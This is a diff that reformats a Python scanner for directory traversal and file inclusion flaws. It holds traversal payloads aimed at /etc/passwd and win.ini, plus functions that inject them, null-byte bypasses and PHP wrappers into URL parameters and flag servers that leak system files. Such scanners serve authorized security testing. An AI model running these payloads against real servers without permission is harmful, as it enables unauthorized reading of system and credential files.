@@ -13,7 +13,6 @@ from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
 
 import requests
 
-
 TRAVERSAL_PAYLOADS = [
     "../../../etc/passwd",
     "..\\..\\..\\windows\\win.ini",
@@ -40,10 +39,27 @@ WINDOWS_INDICATORS = ["[fonts]", "[extensions]", "[mci extensions]", "for 16-bit
 def identify_file_parameters(url: str) -> list[str]:
     """Identify URL parameters that likely handle file paths."""
     file_param_names = [
-        "file", "path", "page", "include", "template", "doc",
-        "document", "folder", "root", "dir", "filename",
-        "download", "read", "load", "view", "content",
-        "img", "image", "src", "resource", "cat",
+        "file",
+        "path",
+        "page",
+        "include",
+        "template",
+        "doc",
+        "document",
+        "folder",
+        "root",
+        "dir",
+        "filename",
+        "download",
+        "read",
+        "load",
+        "view",
+        "content",
+        "img",
+        "image",
+        "src",
+        "resource",
+        "cat",
     ]
 
     parsed = urlparse(url)
@@ -51,7 +67,9 @@ def identify_file_parameters(url: str) -> list[str]:
     return [p for p in params if p.lower() in file_param_names]
 
 
-def test_traversal(url: str, param: str, session: requests.Session = None) -> list[dict]:
+def test_traversal(
+    url: str, param: str, session: requests.Session = None
+) -> list[dict]:
     """Test a parameter for directory traversal vulnerability."""
     if session is None:
         session = requests.Session()
@@ -61,13 +79,21 @@ def test_traversal(url: str, param: str, session: requests.Session = None) -> li
     original_params = parse_qs(parsed.query)
 
     for payload in TRAVERSAL_PAYLOADS:
-        test_params = {k: v[0] if isinstance(v, list) else v for k, v in original_params.items()}
+        test_params = {
+            k: v[0] if isinstance(v, list) else v for k, v in original_params.items()
+        }
         test_params[param] = payload
 
-        test_url = urlunparse((
-            parsed.scheme, parsed.netloc, parsed.path,
-            parsed.params, urlencode(test_params), parsed.fragment,
-        ))
+        test_url = urlunparse(
+            (
+                parsed.scheme,
+                parsed.netloc,
+                parsed.path,
+                parsed.params,
+                urlencode(test_params),
+                parsed.fragment,
+            )
+        )
 
         try:
             resp = session.get(test_url, timeout=10, allow_redirects=False)
@@ -90,16 +116,18 @@ def test_traversal(url: str, param: str, session: requests.Session = None) -> li
                         break
 
             if is_vulnerable:
-                results.append({
-                    "url": test_url,
-                    "parameter": param,
-                    "payload": payload,
-                    "status_code": resp.status_code,
-                    "vulnerable": True,
-                    "evidence": evidence,
-                    "response_length": len(body),
-                    "severity": "HIGH",
-                })
+                results.append(
+                    {
+                        "url": test_url,
+                        "parameter": param,
+                        "payload": payload,
+                        "status_code": resp.status_code,
+                        "vulnerable": True,
+                        "evidence": evidence,
+                        "response_length": len(body),
+                        "severity": "HIGH",
+                    }
+                )
 
         except requests.RequestException:
             continue
@@ -107,7 +135,9 @@ def test_traversal(url: str, param: str, session: requests.Session = None) -> li
     return results
 
 
-def test_null_byte_bypass(url: str, param: str, session: requests.Session = None) -> list[dict]:
+def test_null_byte_bypass(
+    url: str, param: str, session: requests.Session = None
+) -> list[dict]:
     """Test null byte injection to bypass file extension checks."""
     if session is None:
         session = requests.Session()
@@ -124,31 +154,43 @@ def test_null_byte_bypass(url: str, param: str, session: requests.Session = None
     original_params = parse_qs(parsed.query)
 
     for payload in null_payloads:
-        test_params = {k: v[0] if isinstance(v, list) else v for k, v in original_params.items()}
+        test_params = {
+            k: v[0] if isinstance(v, list) else v for k, v in original_params.items()
+        }
         test_params[param] = payload
 
-        test_url = urlunparse((
-            parsed.scheme, parsed.netloc, parsed.path,
-            parsed.params, urlencode(test_params), parsed.fragment,
-        ))
+        test_url = urlunparse(
+            (
+                parsed.scheme,
+                parsed.netloc,
+                parsed.path,
+                parsed.params,
+                urlencode(test_params),
+                parsed.fragment,
+            )
+        )
 
         try:
             resp = session.get(test_url, timeout=10)
             if any(ind in resp.text for ind in LINUX_INDICATORS):
-                results.append({
-                    "url": test_url,
-                    "payload": payload,
-                    "bypass_type": "null_byte",
-                    "vulnerable": True,
-                    "severity": "CRITICAL",
-                })
+                results.append(
+                    {
+                        "url": test_url,
+                        "payload": payload,
+                        "bypass_type": "null_byte",
+                        "vulnerable": True,
+                        "severity": "CRITICAL",
+                    }
+                )
         except requests.RequestException:
             continue
 
     return results
 
 
-def test_wrapper_protocols(url: str, param: str, session: requests.Session = None) -> list[dict]:
+def test_wrapper_protocols(
+    url: str, param: str, session: requests.Session = None
+) -> list[dict]:
     """Test PHP wrapper protocols for LFI exploitation."""
     if session is None:
         session = requests.Session()
@@ -166,30 +208,40 @@ def test_wrapper_protocols(url: str, param: str, session: requests.Session = Non
     original_params = parse_qs(parsed.query)
 
     for wrapper, description in wrappers:
-        test_params = {k: v[0] if isinstance(v, list) else v for k, v in original_params.items()}
+        test_params = {
+            k: v[0] if isinstance(v, list) else v for k, v in original_params.items()
+        }
         test_params[param] = wrapper
 
-        test_url = urlunparse((
-            parsed.scheme, parsed.netloc, parsed.path,
-            parsed.params, urlencode(test_params), parsed.fragment,
-        ))
+        test_url = urlunparse(
+            (
+                parsed.scheme,
+                parsed.netloc,
+                parsed.path,
+                parsed.params,
+                urlencode(test_params),
+                parsed.fragment,
+            )
+        )
 
         try:
             resp = session.get(test_url, timeout=10)
             suspicious = (
-                resp.status_code == 200 and
-                len(resp.text) > 100 and
-                "404" not in resp.text.lower()[:200]
+                resp.status_code == 200
+                and len(resp.text) > 100
+                and "404" not in resp.text.lower()[:200]
             )
             if suspicious:
-                results.append({
-                    "url": test_url,
-                    "wrapper": wrapper,
-                    "description": description,
-                    "status_code": resp.status_code,
-                    "response_length": len(resp.text),
-                    "severity": "CRITICAL",
-                })
+                results.append(
+                    {
+                        "url": test_url,
+                        "wrapper": wrapper,
+                        "description": description,
+                        "status_code": resp.status_code,
+                        "response_length": len(resp.text),
+                        "severity": "CRITICAL",
+                    }
+                )
         except requests.RequestException:
             continue
 
